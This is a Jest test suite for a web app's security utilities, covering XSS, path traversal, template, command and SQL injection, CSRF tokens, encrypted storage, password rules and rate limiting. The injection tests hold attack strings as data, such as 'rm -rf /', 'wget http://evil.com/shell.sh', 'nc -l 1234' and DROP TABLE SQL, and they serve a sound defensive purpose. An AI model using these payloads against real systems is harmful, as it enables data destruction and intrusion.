/**
 * Comprehensive Security Utilities Test Suite
 * 
 * This test suite provides comprehensive validation of security utilities
 * with focus on XSS prevention, CSRF protection, input sanitization,
 * and secure storage mechanisms.
 * 
 * Phase 4.1.1: Enhanced Security Testing
 * Tests existing sanitization functions with expanded attack vectors
 */

import { 
  sanitizeInput, 
  sanitizeSearchInput, 
  validateInput, 
  csrfUtils, 
  secureStorage, 
  passwordUtils, 
  RateLimiter 
} from '../../utils/security';

describe('Security Utils - Enhanced Test Suite', () => {
  beforeEach(() => {
    // Clear all storage before each test
    sessionStorage.clear();
    localStorage.clear();
  });

  afterEach(() => {
    sessionStorage.clear();
    localStorage.clear();
  });

  describe('Input Sanitization - XSS Prevention', () => {
    describe('sanitizeInput', () => {
      it('should remove basic XSS script tags', () => {
        const maliciousInputs = [
          '<script>alert("xss")</script>',
          '<SCRIPT>alert("xss")</SCRIPT>',
          '<script src="evil.js"></script>',
          '<script>window.location="http://evil.com"</script>'
        ];

        maliciousInputs.forEach(input => {
          const result = sanitizeInput(input);
          expect(result).not.toContain('<script>');
          expect(result).not.toContain('<SCRIPT>');
          expect(result).not.toContain('</script>');
          expect(result).not.toContain('alert(');
        });
      });

      it('should remove HTML event handlers', () => {
        const eventHandlers = [
          '<div onclick="alert(1)">test</div>',
          '<img onload="alert(1)" src="x">',
          '<body onload="alert(1)">',
          '<a href="#" onmouseover="alert(1)">link</a>',
          '<input onfocus="alert(1)">',
          '<form onsubmit="alert(1)">',
          '<iframe onload="alert(1)"></iframe>'
        ];

        eventHandlers.forEach(input => {
          const result = sanitizeInput(input);
          expect(result).not.toMatch(/on\w+=/i);
        });
      });

      it('should remove javascript: protocol', () => {
        const jsProtocols = [
          'javascript:alert(1)',
          'JAVASCRIPT:alert(1)',
          'javascript:void(0)',
          'javascript:window.location="http://evil.com"'
        ];

        jsProtocols.forEach(input => {
          const result = sanitizeInput(input);
          expect(result).not.toContain('javascript:');
          expect(result).not.toContain('JAVASCRIPT:');
        });
      });

      it('should block path traversal attacks', () => {
        const pathTraversals = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32',
          '....//....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ];

        pathTraversals.forEach(input => {
          const result = sanitizeInput(input);
          expect(result).not.toContain('../');
          expect(result).not.toContain('..\\');
        });
      });

      it('should block template injection attacks', () => {
        const templateInjections = [
          '{{7*7}}',
          '${7*7}',
          '{{constructor.constructor("alert(1)")()}}',
          '${constructor.constructor("alert(1)")()}',
          '{{#each items}}{{name}}{{/each}}',
          '<%=7*7%>',
          '{%for item in items%}{%endfor%}'
        ];

        templateInjections.forEach(input => {
          const result = sanitizeInput(input);
          expect(result).not.toMatch(/\{\{.*?\}\}/);
          expect(result).not.toMatch(/\$\{.*?\}/);
          expect(result).not.toMatch(/<%.*?%>/);
          expect(result).not.toMatch(/\{%.*?%\}/);
        });
      });

      it('should block command injection attempts', () => {
        const commandInjections = [
          '; rm -rf /',
          '&& cat /etc/passwd',
          '| nc -l 1234',
          '; echo "pwned"',
          '`whoami`',
          '$(id)',
          '; curl http://evil.com',
          '; wget http://evil.com/shell.sh',
          '() { :; }; echo vulnerable'
        ];

        commandInjections.forEach(input => {
          const result = sanitizeInput(input);
          expect(result).not.toMatch(/;\s*(rm|cat|ls|echo|curl|wget|nc|bash|sh)/i);
        });
      });

      it('should block SQL injection patterns', () => {
        const sqlInjections = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "' UNION SELECT * FROM users --",
          "'; INSERT INTO users VALUES ('hacker', 'password'); --",
          "' OR 1=1 --",
          "'; DELETE FROM users; --",
          "' OR 'a'='a",
          "'; CREATE TABLE pwned (id int); --"
        ];

        sqlInjections.forEach(input => {
          const result = sanitizeInput(input);
          expect(result).not.toMatch(/DROP\s+TABLE/i);
          expect(result).not.toMatch(/UNION\s+SELECT/i);
          expect(result).not.toMatch(/INSERT\s+INTO/i);
          expect(result).not.toMatch(/DELETE\s+FROM/i);
          expect(result).not.toMatch(/CREATE\s+TABLE/i);
        });
      });

      it('should handle mixed attack vectors', () => {
        const mixedAttacks = [
          '<script>alert("xss")</script>; rm -rf /',
          '{{7*7}}<img onerror="alert(1)" src="x">',
          'javascript:alert(1); DROP TABLE users;',
          '../../../etc/passwd<script>alert("xss")</script>',
          '${constructor.constructor("alert(1)")()}; cat /etc/passwd'
        ];

        mixedAttacks.forEach(input => {
          const result = sanitizeInput(input);
          expect(result).not.toContain('<script>');
          expect(result).not.toMatch(/on\w+=/i);
          expect(result).not.toContain('javascript:');
          expect(result).not.toContain('../');
          expect(result).not.toMatch(/\{\{.*?\}\}/);
          expect(result).not.toMatch(/\$\{.*?\}/);
          expect(result).not.toMatch(/;\s*(rm|cat|echo)/i);
          expect(result).not.toMatch(/DROP\s+TABLE/i);
        });
      });

      it('should preserve safe content', () => {
        const safeInputs = [
          'Hello, World!',
          'User123',
          'This is a normal sentence.',
          'anime-title-123',
          'user@example.com',
          'Valid search term',
          'Normal text with spaces',
          'Hyphen-separated-words',
          'Numbers 123 and symbols !@#$%^&*()',
          'Unicode characters: café, naïve, résumé'
        ];

        safeInputs.forEach(input => {
          const result = sanitizeInput(input);
          expect(result.trim()).toBe(input);
        });
      });
    });

    describe('sanitizeSearchInput', () => {
      it('should preserve search-friendly content', () => {
        const searchInputs = [
          'attack on titan',
          'one piece episode 1000',
          'anime 2024',
          'manga recommendation',
          'action adventure comedy',
          'studio ghibli',
          'miyazaki hayao',
          'jujutsu kaisen season 2'
        ];

        searchInputs.forEach(input => {
          const result = sanitizeSearchInput(input);
          expect(result).toBe(input);
        });
      });

      it('should still block dangerous patterns in search', () => {
        const dangerousSearches = [
          '<script>alert("xss")</script> anime',
          'attack on titan; rm -rf /',
          'one piece {{7*7}}',
          'anime javascript:alert(1)',
          '../../../etc/passwd anime'
        ];

        dangerousSearches.forEach(input => {
          const result = sanitizeSearchInput(input);
          expect(result).not.toContain('<script>');
          expect(result).not.toMatch(/;\s*(rm|cat|echo)/i);
          expect(result).not.toMatch(/\{\{.*?\}\}/);
          expect(result).not.toContain('javascript:');
          expect(result).not.toContain('../');
        });
      });

      it('should normalize whitespace in search', () => {
        const whitespaceInputs = [
          '   anime   ',
          'attack    on    titan',
          'one\tpiece\nmannga',
          '  \n\t  search term  \n\t  '
        ];

        whitespaceInputs.forEach(input => {
          const result = sanitizeSearchInput(input);
          expect(result).not.toMatch(/\s{2,}/);
          expect(result).not.toMatch(/^\s+|\s+$/);
        });
      });
    });

    describe('validateInput', () => {
      it('should reject input with dangerous patterns', () => {
        const dangerousInputs = [
          '<script>alert(1)</script>',
          'javascript:alert(1)',
          '../../../etc/passwd',
          '{{7*7}}',
          '${constructor.constructor("alert(1)")()}',
          '; rm -rf /',
          "'; DROP TABLE users; --",
          '<img onerror="alert(1)" src="x">'
        ];

        dangerousInputs.forEach(input => {
          const result = validateInput(input);
          expect(result.isValid).toBe(false);
          expect(result.sanitized).toBe('');
        });
      });

      it('should reject input exceeding length limit', () => {
        const longInput = 'a'.repeat(101);
        const result = validateInput(longInput, 100);
        expect(result.isValid).toBe(false);
        expect(result.sanitized).toBe('');
      });

      it('should accept and sanitize valid input', () => {
        const validInputs = [
          'Hello World',
          'anime123',
          'user@example.com',
          'Valid text input'
        ];

        validInputs.forEach(input => {
          const result = validateInput(input);
          expect(result.isValid).toBe(true);
          expect(result.sanitized).toBe(input);
        });
      });

      it('should respect custom length limits', () => {
        const input = 'valid input';
        
        // Should pass with higher limit
        const resultHigh = validateInput(input, 50);
        expect(resultHigh.isValid).toBe(true);
        
        // Should fail with lower limit
        const resultLow = validateInput(input, 5);
        expect(resultLow.isValid).toBe(false);
      });
    });
  });

  describe('CSRF Protection', () => {
    describe('csrfUtils', () => {
      it('should generate valid CSRF tokens', () => {
        const token = csrfUtils.generateToken();
        expect(token).toBeDefined();
        expect(token.length).toBe(64);
        expect(token).toMatch(/^[a-f0-9]+$/);
      });

      it('should store token in session storage', () => {
        const token = csrfUtils.generateToken();
        expect(sessionStorage.getItem('csrf_token')).toBe(token);
      });

      it('should validate correct tokens', () => {
        const token = csrfUtils.generateToken();
        expect(csrfUtils.validateToken(token)).toBe(true);
      });

      it('should reject invalid tokens', () => {
        csrfUtils.generateToken();
        expect(csrfUtils.validateToken('invalid')).toBe(false);
        expect(csrfUtils.validateToken('')).toBe(false);
        expect(csrfUtils.validateToken('short')).toBe(false);
      });

      it('should reject tokens when none stored', () => {
        expect(csrfUtils.validateToken('anytokenhere')).toBe(false);
      });

      it('should remove tokens properly', () => {
        const token = csrfUtils.generateToken();
        expect(csrfUtils.getToken()).toBe(token);
        
        csrfUtils.removeToken();
        expect(csrfUtils.getToken()).toBe(null);
      });

      it('should generate different tokens each time', () => {
        const token1 = csrfUtils.generateToken();
        const token2 = csrfUtils.generateToken();
        expect(token1).not.toBe(token2);
      });
    });
  });

  describe('Secure Storage', () => {
    describe('secureStorage', () => {
      it('should store and retrieve data', () => {
        const testData = 'sensitive information';
        secureStorage.setItem('testKey', testData);
        const retrieved = secureStorage.getItem('testKey');
        expect(retrieved).toBe(testData);
      });

      it('should handle JSON data', () => {
        const testObject = { 
          userId: 123, 
          token: 'secret-token',
          preferences: { theme: 'dark', notifications: true }
        };
        
        secureStorage.setItem('userObject', JSON.stringify(testObject));
        const retrieved = secureStorage.getItem('userObject');
        expect(JSON.parse(retrieved!)).toEqual(testObject);
      });

      it('should return null for non-existent keys', () => {
        const result = secureStorage.getItem('nonExistentKey');
        expect(result).toBe(null);
      });

      it('should remove items properly', () => {
        secureStorage.setItem('tempKey', 'tempValue');
        expect(secureStorage.getItem('tempKey')).toBe('tempValue');
        
        secureStorage.removeItem('tempKey');
        expect(secureStorage.getItem('tempKey')).toBe(null);
      });

      it('should handle encryption errors gracefully', () => {
        // Mock CryptoJS to throw error
        const originalCrypto = window.crypto;
        delete (window as any).crypto;
        
        // Should still work with fallback
        secureStorage.setItem('fallbackKey', 'fallbackValue');
        const result = secureStorage.getItem('fallbackKey');
        expect(result).toBe('fallbackValue');
        
        // Restore crypto
        (window as any).crypto = originalCrypto;
      });
    });
  });

  describe('Password Validation', () => {
    describe('passwordUtils', () => {
      it('should validate strong passwords', () => {
        const strongPasswords = [
          'StrongPass123!',
          'MySecure@Password1',
          'Complex#Password99',
          'Valid$Password2024!'
        ];

        strongPasswords.forEach(password => {
          const result = passwordUtils.validateStrength(password);
          expect(result.isValid).toBe(true);
          expect(result.errors).toHaveLength(0);
        });
      });

      it('should reject passwords that are too short', () => {
        const shortPasswords = ['short', '123', 'ab', 'Pass1!'];

        shortPasswords.forEach(password => {
          const result = passwordUtils.validateStrength(password);
          expect(result.isValid).toBe(false);
          expect(result.errors).toContain('Password must be at least 8 characters long');
        });
      });

      it('should require uppercase letters', () => {
        const noUppercase = ['lowercase123!', 'password123!', 'weak@pass1'];

        noUppercase.forEach(password => {
          const result = passwordUtils.validateStrength(password);
          expect(result.isValid).toBe(false);
          expect(result.errors).toContain('Password must contain at least one uppercase letter');
        });
      });

      it('should require lowercase letters', () => {
        const noLowercase = ['UPPERCASE123!', 'PASSWORD123!', 'WEAK@PASS1'];

        noLowercase.forEach(password => {
          const result = passwordUtils.validateStrength(password);
          expect(result.isValid).toBe(false);
          expect(result.errors).toContain('Password must contain at least one lowercase letter');
        });
      });

      it('should require numbers', () => {
        const noNumbers = ['Password!', 'WeakPass@', 'Strong#Pass'];

        noNumbers.forEach(password => {
          const result = passwordUtils.validateStrength(password);
          expect(result.isValid).toBe(false);
          expect(result.errors).toContain('Password must contain at least one number');
        });
      });

      it('should require special characters', () => {
        const noSpecial = ['Password123', 'WeakPass123', 'StrongPass1'];

        noSpecial.forEach(password => {
          const result = passwordUtils.validateStrength(password);
          expect(result.isValid).toBe(false);
          expect(result.errors).toContain('Password must contain at least one special character');
        });
      });

      it('should provide multiple error messages', () => {
        const result = passwordUtils.validateStrength('weak');
        expect(result.isValid).toBe(false);
        expect(result.errors).toHaveLength(4);
        expect(result.errors).toContain('Password must be at least 8 characters long');
        expect(result.errors).toContain('Password must contain at least one uppercase letter');
        expect(result.errors).toContain('Password must contain at least one number');
        expect(result.errors).toContain('Password must contain at least one special character');
      });
    });
  });

  describe('Rate Limiting', () => {
    describe('RateLimiter', () => {
      it('should allow requests within limit', () => {
        const limiter = new RateLimiter(5, 60000); // 5 requests per minute
        
        for (let i = 0; i < 5; i++) {
          expect(limiter.isAllowed('user123')).toBe(true);
        }
      });

      it('should block requests exceeding limit', () => {
        const limiter = new RateLimiter(3, 60000); // 3 requests per minute
        
        // First 3 should pass
        for (let i = 0; i < 3; i++) {
          expect(limiter.isAllowed('user123')).toBe(true);
        }
        
        // 4th should fail
        expect(limiter.isAllowed('user123')).toBe(false);
      });

      it('should handle different keys independently', () => {
        const limiter = new RateLimiter(2, 60000);
        
        expect(limiter.isAllowed('user1')).toBe(true);
        expect(limiter.isAllowed('user2')).toBe(true);
        expect(limiter.isAllowed('user1')).toBe(true);
        expect(limiter.isAllowed('user2')).toBe(true);
        
        // Both should be blocked now
        expect(limiter.isAllowed('user1')).toBe(false);
        expect(limiter.isAllowed('user2')).toBe(false);
      });

      it('should reset limits after time window', () => {
        const limiter = new RateLimiter(1, 100); // 1 request per 100ms
        
        expect(limiter.isAllowed('user123')).toBe(true);
        expect(limiter.isAllowed('user123')).toBe(false);
        
        // Wait for window to expire
        return new Promise(resolve => {
          setTimeout(() => {
            expect(limiter.isAllowed('user123')).toBe(true);
            resolve(undefined);
          }, 150);
        });
      });

      it('should reset individual keys', () => {
        const limiter = new RateLimiter(1, 60000);
        
        expect(limiter.isAllowed('user123')).toBe(true);
        expect(limiter.isAllowed('user123')).toBe(false);
        
        limiter.reset('user123');
        expect(limiter.isAllowed('user123')).toBe(true);
      });

      it('should handle concurrent requests properly', () => {
        const limiter = new RateLimiter(5, 60000);
        const results = [];
        
        // Simulate concurrent requests
        for (let i = 0; i < 10; i++) {
          results.push(limiter.isAllowed('user123'));
        }
        
        const allowed = results.filter(r => r === true);
        const blocked = results.filter(r => r === false);
        
        expect(allowed).toHaveLength(5);
        expect(blocked).toHaveLength(5);
      });
    });
  });

  describe('Integration Security Tests', () => {
    it('should handle chained attacks', () => {
      const chainedAttack = '<script>alert(1)</script>{{7*7}}; rm -rf /';
      
      const sanitized = sanitizeInput(chainedAttack);
      const validated = validateInput(chainedAttack);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toMatch(/\{\{.*?\}\}/);
      expect(sanitized).not.toMatch(/;\s*rm/);
      expect(validated.isValid).toBe(false);
    });

    it('should maintain security with rate limiting', () => {
      const limiter = new RateLimiter(3, 60000);
      const attacks = [
        '<script>alert(1)</script>',
        'javascript:alert(1)',
        '../../../etc/passwd',
        '{{7*7}}',
        '; rm -rf /'
      ];

      attacks.forEach(attack => {
        const allowed = limiter.isAllowed('attacker');
        const sanitized = sanitizeInput(attack);
        const validated = validateInput(attack);

        if (allowed) {
          expect(validated.isValid).toBe(false);
          expect(sanitized).not.toContain('<script>');
        }
      });
    });

    it('should protect sensitive data in storage', () => {
      const sensitiveData = {
        apiKey: 'secret-api-key-123',
        userToken: 'jwt-token-here',
        personalInfo: { ssn: '123-45-6789', creditCard: '4111-1111-1111-1111' }
      };

      secureStorage.setItem('sensitiveData', JSON.stringify(sensitiveData));
      
      // Check that raw storage contains encrypted data
      const rawStored = localStorage.getItem('sensitiveData');
      expect(rawStored).toBeDefined();
      expect(rawStored).not.toContain('secret-api-key-123');
      expect(rawStored).not.toContain('jwt-token-here');
      expect(rawStored).not.toContain('123-45-6789');
      
      // But decrypted data should be correct
      const retrieved = secureStorage.getItem('sensitiveData');
      expect(JSON.parse(retrieved!)).toEqual(sensitiveData);
    });
  });

  describe('Performance Security Tests', () => {
    it('should handle large input sanitization efficiently', () => {
      const largeInput = '<script>alert(1)</script>'.repeat(1000);
      const start = performance.now();
      const result = sanitizeInput(largeInput);
      const end = performance.now();
      
      expect(end - start).toBeLessThan(100); // Should complete within 100ms
      expect(result).not.toContain('<script>');
    });

    it('should handle rate limiting efficiently', () => {
      const limiter = new RateLimiter(1000, 60000);
      const start = performance.now();
      
      for (let i = 0; i < 1000; i++) {
        limiter.isAllowed(`user${i}`);
      }
      
      const end = performance.now();
      expect(end - start).toBeLessThan(100); // Should complete within 100ms
    });

    it('should handle CSRF token generation efficiently', () => {
      const start = performance.now();
      
      for (let i = 0; i < 100; i++) {
        csrfUtils.generateToken();
      }
      
      const end = performance.now();
      expect(end - start).toBeLessThan(100); // Should complete within 100ms
    });
  });
});